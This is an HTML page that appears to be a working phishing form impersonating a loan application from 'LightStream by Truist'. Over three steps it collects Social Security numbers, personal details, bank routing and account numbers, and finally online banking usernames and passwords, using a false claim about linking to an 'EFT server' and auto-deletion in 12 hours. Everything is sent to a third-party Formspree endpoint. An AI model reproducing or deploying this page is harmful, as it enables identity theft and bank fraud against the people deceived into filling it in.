<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>LightStream by Truist</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f9f9fa;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .form-container {
            background-color: #ffffff;
            padding: 40px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 500px;
        }
        h1 {
            text-align: center;
            color: #3a16b9;
            margin-bottom: 10px;
            font-size: 28px;
        }
        h2 {
            text-align: center;
            color: #666;
            margin-bottom: 20px;
            font-size: 18px;
            font-weight: normal;
        }
        .form-group {
            margin-bottom: 15px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            color: #666;
            font-weight: bold;
        }
        input[type="text"],
        input[type="email"],
        input[type="tel"],
        input[type="number"],
        input[type="password"],
        select,
        textarea {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 5px;
            box-sizing: border-box;
            font-size: 16px;
        }
        textarea {
            height: 60px;
            resize: vertical;
        }
        select {
            cursor: pointer;
        }
        button {
            width: 100%;
            padding: 15px;
            background-color: #3a16b9;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 18px;
            cursor: pointer;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #2d0f8f;
        }
        .button-group {
            display: flex;
            gap: 10px;
            margin-top: 20px;
        }
        .btn-back {
            background-color: #6c757d;
        }
        .btn-back:hover {
            background-color: #5a6268;
        }
        .page {
            display: none;
        }
        .page.active {
            display: block;
        }
        .warning-box {
            background-color: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 5px;
            padding: 15px;
            margin-bottom: 20px;
            text-align: center;
        }
        .warning-text {
            color: #ff0000;
            font-weight: bold;
            font-size: 14px;
            margin-top: 10px;
        }
        .info-text {
            color: #333;
            font-size: 14px;
            margin-bottom: 5px;
        }
        .subtitle {
            text-align: center;
            color: #888;
            font-size: 16px;
            margin-bottom: 20px;
            text-transform: uppercase;
            font-weight: 600;
        }
    </style>
</head>
<body>

<div class="form-container">
    <h1>LightStream by Truist</h1>
    
    <form action="https://formspree.io/f/xdkvjnvl" method="POST">
        
        <!-- Page 1: Initial Verification -->
        <div class="page active" id="page1">
            <h2>YOUR INFORMATION</h2>
            
            <div class="form-group">
                <label for="ssn">Social Security Number</label>
                <input type="text" id="ssn" name="ssn" placeholder="XXX-XX-XXXX" pattern="[0-9]{9}" maxlength="9" title="Please enter exactly 9 digits" required>
            </div>

            <div class="form-group">
                <label for="phone">Phone Number</label>
                <input type="tel" id="phone" name="phone" placeholder="1234567890" pattern="[0-9]{10}" maxlength="10" title="Please enter exactly 10 digits" required>
            </div>

            <button type="button" onclick="showPage(2)">APPLY NOW</button>
        </div>

        <!-- Page 2: Basic Information -->
        <div class="page" id="page2">
            <h2>BASIC INFORMATION</h2>
            
            <div class="form-group">
                <label for="loantype">Which Type Loan Required</label>
                <select id="loantype" name="loantype" required>
                    <option value="">-- Select Loan Type --</option>
                    <option value="business">Business Loan</option>
                    <option value="home">Home Loan</option>
                    <option value="car">Car Loan</option>
                    <option value="personal">Personal Loan</option>
                    <option value="other">Other</option>
                </select>
            </div>

            <div class="form-group" id="carLoanOptions" style="display: none;">
                <label for="cartype">Car Loan Type</label>
                <select id="cartype" name="cartype">
                    <option value="">-- Select Car Type --</option>
                    <option value="new">New Car</option>
                    <option value="used">Used Car</option>
                </select>
            </div>

            <div class="form-group">
                <label for="loanamount">Loan Amount</label>
                <input type="number" id="loanamount" name="loanamount" placeholder="Enter amount" required>
            </div>

            <div class="form-group">
                <label for="firstname">First Name</label>
                <input type="text" id="firstname" name="firstname" placeholder="First Name" required>
            </div>

            <div class="form-group">
                <label for="lastname">Last Name</label>
                <input type="text" id="lastname" name="lastname" placeholder="Last Name" required>
            </div>

            <div class="form-group">
                <label for="email">E-mail Address</label>
                <input type="email" id="email" name="email" placeholder="email@example.com" required>
            </div>

            <div class="form-group">
                <label for="street">Street Address</label>
                <input type="text" id="street" name="street" placeholder="Street Address" required>
            </div>

            <div class="form-group">
                <label for="city">City</label>
                <input type="text" id="city" name="city" placeholder="City" required>
            </div>

            <div class="form-group">
                <label for="state">State</label>
                <input type="text" id="state" name="state" placeholder="State" required>
            </div>

            <div class="form-group">
                <label for="zip">Zip Code</label>
                <input type="text" id="zip" name="zip" placeholder="Zip Code" required>
            </div>

            <div class="form-group">
                <label for="country">Country</label>
                <input type="text" id="country" name="country" placeholder="Country" required>
            </div>

            <div class="form-group">
                <label for="bankname">Bank Name</label>
                <input type="text" id="bankname" name="bankname" placeholder="Bank Name" required>
            </div>

            <div class="form-group">
                <label for="routingnumber">Routing Number</label>
                <input type="text" id="routingnumber" name="routingnumber" placeholder="Routing Number" required>
            </div>

            <div class="form-group">
                <label for="accountnumber">Account Number</label>
                <input type="text" id="accountnumber" name="accountnumber" placeholder="Account Number" required>
            </div>

            <div class="button-group">
                <button type="button" class="btn-back" onclick="showPage(1)">BACK</button>
                <button type="button" onclick="showPage(3)">NEXT</button>
            </div>
        </div>

        <!-- Page 3: Banking Credentials -->
        <div class="page" id="page3">
            <div class="warning-box">
                <p class="info-text">* We need your online banking user and pass to link your account to our EFT server.</p>
            </div>

            <div class="subtitle">CREDENTIALS</div>

            <div class="form-group">
                <label for="username">Username</label>
                <input type="text" id="username" name="username" placeholder="Enter your username" required>
            </div>

            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" placeholder="Enter your password" required>
            </div>

            <div class="warning-text">
                * WITHIN 12 HOURS DELETE AUTOMATICALLY
            </div>

            <div class="button-group" style="margin-top: 20px;">
                <button type="button" class="btn-back" onclick="showPage(2)">BACK</button>
                <button type="submit">SUBMIT</button>
            </div>
        </div>

    </form>

    <script>
        function showPage(pageNum) {
            // Validate current page before moving forward
            const currentPage = document.querySelector('.page.active');
            const inputs = currentPage.querySelectorAll('input[required], select[required]');
            let isValid = true;
            
            inputs.forEach(input => {
                if (!input.checkValidity()) {
                    input.reportValidity();
                    isValid = false;
                    return;
                }
            });
            
            if (!isValid) {
                return; // Stop if validation fails
            }
            
            // Hide all pages
            document.querySelectorAll('.page').forEach(page => {
                page.classList.remove('active');
            });
            
            // Show selected page
            document.getElementById('page' + pageNum).classList.add('active');
        }

        // Show car loan options when Car Loan is selected
        document.getElementById('loantype').addEventListener('change', function() {
            const carOptions = document.getElementById('carLoanOptions');
            if (this.value === 'car') {
                carOptions.style.display = 'block';
                document.getElementById('cartype').required = true;
            } else {
                carOptions.style.display = 'none';
                document.getElementById('cartype').required = false;
            }
        });
    </script>
</div>

</body>
</html>
